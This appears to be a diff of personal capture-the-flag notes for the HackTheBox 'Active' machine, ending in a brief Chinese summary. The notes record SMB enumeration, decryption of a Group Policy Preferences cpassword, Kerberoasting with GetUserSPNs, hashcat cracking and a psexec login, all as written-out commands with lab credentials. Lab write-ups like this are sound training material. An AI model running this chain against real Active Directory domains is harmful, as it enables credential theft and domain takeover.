@@ -1,0 +1,48 @@
+nmap -sVC   10.129.113.17  -Pn > nmap.txt
+
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+userName="active.htb\SVC_TGS"
+GPPstillStandingStrong2k18
+
+
+
+Ticketmaster1968
+nmap -sVC  10.129.112.186  -Pn > nmap.txt
+nmap -v -p 139, 445 --script=smb* 10.129.112.186 > smb.txt
+nmap --script=smb-enum-shares -Pn -p 445 10.129.112.186
+smbmap -R Replication -H 10.129.86.187 --depth 10
+smbclient  //10.129.86.187/Replication/ -U SVC_TGS
+smbclient  //10.129.86.187/Users/ -U SVC_TGS
+smbmap -R  -H 10.129.86.187 -u  SVC_TGS  -p GPPstillStandingStrong2k18
+smb: \> recurse on
+smb: \> prompt off
+smb: \> mget *
+
+Enum4linux -u SVC_TGS -p GPPstillStandingStrong2k18 -a active.htb
+Group 'Domain Users' (RID: 513) has member: ACTIVE\Administrator
+Group 'Domain Users' (RID: 513) has member: ACTIVE\krbtgt
+Group 'Domain Users' (RID: 513) has member: ACTIVE\SVC_TGS
+
+
+
+ADMIN$        NO ACCESS       Remote Admin
+C$            NO ACCESS       Default share
+IPC$          NO ACCESS       Remote IPC
+NETLOGON      READ ONLY       Logon server share
+Replication   READ ONLY
+SYSVOL        READ ONLY       Logon server share
+Users         READ ONLY
+
+python exploit.py -request -dc-ip 10.129.113.17 ACTIVE.HTB/SVC_TGS:GPPstillStandingStrong2k18
+
+hashcat -m 13100  keber.hash /usr/share/wordlists/rockyou.txt
+
+Ticketmaster1968
+
+1.nmap查找到samba服務,smbmap -H 10.129.86.187 查看到可讀文件夾Replication
+2.smbmap遞迴所有路徑文件查找到Groups.xml,複製到本地後打開發現有cpassword
+3.google cpassword發現在Group Policy Preferences 使用gpp-decrypt解密後得到密碼GPPstillStandingStrong2k18
+使用exploit取得spns密碼
+5.破解spns密碼後,使用psexec.py登入
+
+GetUserSPNs.py
